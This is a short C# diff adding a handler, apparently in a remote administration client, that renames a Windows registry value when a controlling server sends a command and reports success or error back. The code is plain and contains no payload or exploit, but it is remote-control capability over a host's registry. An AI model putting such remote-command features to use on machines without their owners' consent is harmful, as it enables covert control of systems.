@@ -167,6 +167,27 @@ namespace xClient.Core.Commands
             responsePacket.Execute(client);
         }
 
+        public static void HandleRenameRegistryValue(xClient.Core.Packets.ServerPackets.DoRenameRegistryValue packet, Client client)
+        {
+            xClient.Core.Packets.ClientPackets.GetRenameRegistryValueResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryValueResponse();
+            string errorMsg = "";
+            try
+            {
+                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
+            }
+            catch (Exception ex)
+            {
+                responsePacket.IsError = true;
+                errorMsg = ex.Message;
+            }
+            responsePacket.ErrorMsg = errorMsg;
+            responsePacket.KeyPath = packet.KeyPath;
+            responsePacket.OldValueName = packet.OldValueName;
+            responsePacket.NewValueName = packet.NewValueName;
+
+            responsePacket.Execute(client);
+        }
+
         #endregion
     }
 }
